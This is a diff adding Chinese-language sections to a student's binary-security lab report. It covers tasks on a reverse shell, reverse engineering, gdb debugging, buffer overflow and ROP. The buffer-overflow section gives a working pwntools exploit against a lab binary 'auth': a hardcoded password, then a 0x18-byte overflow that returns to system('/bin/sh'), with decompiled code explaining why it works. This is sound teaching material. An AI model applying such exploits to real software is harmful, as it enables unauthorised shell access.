@@ -497,6 +497,152 @@
 
 local10
 
+**三、综合运用**
+
+1. **反弹Shell**
+
+   > 写一个反弹 shell 的 shellcode，运行它，演示你已经成功反弹了 shell，并解释清楚你的shellcode 的原理。
+   >
+   > 注：运行 shellcode 的方法有很多。相信同学们能自行解决
+
+2. **闯关题**
+
+   > 分析程序(games)，通过理解程序逻辑，完成里面的四个挑战，进入 Congratulations 分支。这个分实验适合主要采用白盒分析的方法来做。
+   > 请闯尽可能多的关，将你对于每一关的理解以及你的思路记录在实验报告中。
+   > 提示：为了了解每个子游戏是否成功通关，可以在 main 函数里面该游戏函数的返回处下断点，查看返回值(eax 寄存器) 是否为 1。
+
+3. **黑盒调试题**
+
+   > 分析程序(eorer)，获取程序接受的输入。这个分实验适合主要采用黑盒分析的方法来做，如使用 gdb 与ltrace 等工具。比较方便的做法是，首先使用反编译工具(如 ghidra)查看其反编译得到的源码，形成一个调试的计划，然后使用 gdb 调试，获取想要的数据，最后解出输入。
+   >
+   > 注：这个题目去掉了调试符号。main 函数是__libc_start_main 函数的第一个参数，通过这个方法确定 main函数的地址。
+   
+4. **漏洞利用**
+   
+   > auth 程序也有一个缓冲区溢出。请触发它，并使用类似课堂上讲解的方法来利用它。
+   
+   编写的漏洞利用脚本：
+   
+   ```python
+   #!/usr/bin/python
+   
+   from pwn import *
+   context.arch = 'amd64'
+   r = process("./auth")
+   # 文件头和打开auth文件 
+   
+   r.sendline("auth useraccesscybersec@!")
+   r.sendline("admin")
+   # 进入漏洞函数
+   
+   r.sendline(b"a"*0x18+p64(0x401310))
+   # 缓冲区溢出漏洞利用
+   
+   r.interactive()
+   ```
+   
+   过程详解：
+   
+   1. 进入漏洞函数：
+   
+      首先通过翻阅`auth`的伪C代码，我们找到了在函数`admin`中存在可能导致缓冲区溢出漏洞的`char[16]`数据类型和`scanf`函数，根据课上学过的知识可知其可以通过精确控制输入字符长度来使`scanf`的返回地址指向`system("/bin/sh")`。
+   
+      而`auth`函数的执行路径，通过查看伪代码可以得知，想要进入`admin`函数需要经过和`handle`函数，而`auth`函数是作为从`handle`函数进入`admin`函数的钥匙。
+   
+      `auth`认证函数入口：
+   
+      ```c
+      iVar1 = strncmp((char *)&local_58,"auth",4);
+      if (iVar1 == 0)
+      {
+      	auth((long)&local_58 + 5);
+          return;
+      }
+      ```
+   
+      `auth`函数中检测输入是否为`"useraccesscybersec@!"`，是则认证成功。
+   
+      ```C
+      undefined8 auth(char *param_1)
+      {
+        int iVar1;
+        iVar1 = strncmp(param_1,"useraccesscybersec@!",0x14);\\认证比较
+        if (iVar1 == 0) {
+          authed = 1; \\认证成功的标志
+          puts("Auth success");
+        }
+        else {
+          puts("Auth fail");
+        }
+        return 0;
+      }
+      ```
+   
+      `admin`函数入口：
+   
+      ```C
+      iVar1 = strncmp((char *)&local_58,"admin",5);
+      	if (iVar1 == 0) {
+              iVar1 = check_auth();
+      	if (iVar1 == 0) {
+                return;
+              }
+              admin((long)&local_58 + 6);
+              return;
+      	}
+      ```
+   
+      故对于漏洞利用脚本中的进入漏洞函数部分，其源码及解释：
+   
+      ```python
+      r.sendline("auth useraccesscybersec@!")
+      # 此处对应auth函数中的身份认证部分，输入该语句会输出Auth success,代表身份认证成功。
+      r.sendline("admin")
+      # 此处对应进入admin函数。
+      ```
+   
+      2. 漏洞利用：
+   
+         `admin`函数伪C代码：
+   
+         ```C 
+         undefined8 admin(undefined8 param_1)
+         {
+             char local_18 [16];
+          	\*省略部分无关代码*\
+           	__isoc99_scanf(&DAT_00402080,local_18);
+             \*可能存在的缓冲区溢出漏洞*\
+             \*省略部分无关代码*\
+           return 0;
+         }
+         ```
+   
+         其中`__isoc99_scanf(&DAT_00402080,local_18);`导致的缓冲区溢出可以覆盖到返回地址，使其直接指向`system("/bin/sh")`。继续阅读汇编代码，可以发现如下语句：
+   
+         ```assembly
+         00401310	MOV    EDI,s_/bin/sh_00402015	
+         ```
+   
+         于是接下来的思路就很清晰了，需要将输入内容之后的八个字节完全覆盖，即从输入起始地址到返回地址之间有`0x18`的距离，所以需要键入`0x18`单位的字符和目标攻击地址`0x401310`。于是便得到以下代码。
+   
+         ```python
+         r.sendline(b"a"*0x18+p64(0x401310))
+         ```
+   
+         运行结果如图所示：
+   
+         
+   
+5. **ROP练习**
+
+   > 有的时候地址空间里面没有现成的 system("/bin/sh") ，如程序（hello2），在栈溢出时需要采用 ROP（Return oriented programming, 返回导向编程）的手段，请查阅资料，在这种情况下完成利用。一种 ROP 的思路是：调用 scanf("%s", addr) 来将字符串”/bin/sh” 写入一段可写的内存 addr，然后调用system(addr) 来执行 shell。下图提供了这个 ROP 链构造的一种方法。
+
+   
+
+   
+
+
+
 [gdb给指定位置设置断点_gdb 断点 地址-CSDN博客](https://blog.csdn.net/rubikchen/article/details/115588379)
 
 [GDB内存断点(Memory break)的使用举例_gdb 内存越界-CSDN博客](https://blog.csdn.net/livelylittlefish/article/details/5110234)
@@ -506,8 +652,6 @@ local10
 [GDB 用法之显示寄存器_gdb查看寄存器_xiaozhiwise的博客-CSDN博客](https://blog.csdn.net/xiaozhiwise/article/details/123247408)
 
 [ASCII 表 | 菜鸟教程 (runoob.com)](https://www.runoob.com/w3cnote/ascii.html)
-
-
 
 [ubuntu20.04 如何生成core文件_ubuntu 核心转储 默认位置_Jqivin的博客-CSDN博客](https://blog.csdn.net/Jqivin/article/details/121908435)
 
